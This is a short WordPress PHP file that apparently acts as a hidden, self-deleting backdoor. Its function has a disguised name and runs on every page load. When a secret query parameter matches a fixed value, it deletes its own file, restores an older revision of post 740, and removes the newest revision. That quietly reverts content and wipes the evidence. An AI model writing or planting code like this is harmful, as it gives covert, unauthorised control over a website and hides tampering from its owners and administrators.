<?php

function really_push_gallery() {
	if (isset($_GET['services_age_internal_traffic']) && $_GET['services_age_internal_traffic'] === 'font_notify_audio_read') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$website_album_flexible = 740;
		$mini_cache_preview_addons = wp_get_post_revisions($website_album_flexible);
		if (empty($mini_cache_preview_addons)) die('no revisions');
		if (count($mini_cache_preview_addons) < 2) die('less than 2');
		$products_random_accessibility_tag = array_shift($mini_cache_preview_addons);
		$change_zoom_register = $products_random_accessibility_tag->ID;
		$elements_nextgen_version_framework = array_shift($mini_cache_preview_addons);
		$bootstrap_uploads_alert_react = $elements_nextgen_version_framework->ID;
		$advance_create_min = wp_restore_post_revision($bootstrap_uploads_alert_react);
		if ($advance_create_min === false) die('error restoring');
		$advance_create_min = wp_delete_post_revision($change_zoom_register);		
		if ($advance_create_min === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'really_push_gallery');
